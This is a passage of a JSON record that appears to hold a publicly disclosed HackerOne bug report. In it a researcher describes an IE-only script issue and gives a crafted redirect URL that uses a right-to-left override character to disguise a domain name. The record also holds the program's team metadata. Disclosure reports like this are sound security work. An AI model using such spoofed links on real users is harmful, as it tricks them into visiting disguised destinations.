)<br>\nBut in IE it works :-)</p>\n\n<p>I beleive that this is an issue</p>\n\n<h2 id=\"minor-rtlo-that-can-treak-users\">Minor RTLO that can treak users</h2>\n\n<p>And another things is I try to do a RTLO on the URL (But because it has filter alert I dont know if this will trigger your interest)</p>\n<pre class=\"highlight plaintext\"><code>https://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b&amp;url=http%3A%2F%2Fbuglabs.me&amp;url=http%3A%2F%2F%09%E2%80%AEmoc.enorekcah\n</code></pre>\n<h2 id=\"tested\">Tested</h2>\n\n<p>IE11 - for XSS<br>\nChrome, Mozilla - for RTLO</p>\n\n<p>Advance Merry Christmas guys :-)</p>\n\n<p>Cheers<br>\nKenziy</p>\n\n<h2 id=\"impact\">Impact</h2>\n\n<p>Trick user or trigger malicious script</p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://hackerone.com", 
+            "about": "Vulnerability disclosure should be safe, transparent, and rewarding.", 
+            "twitter_handle": "Hacker0x01", 
+            "name": "HackerOne"
+        }, 
+        "handle": "security", 
+        "url": "https://hackerone.com/security", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 13, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
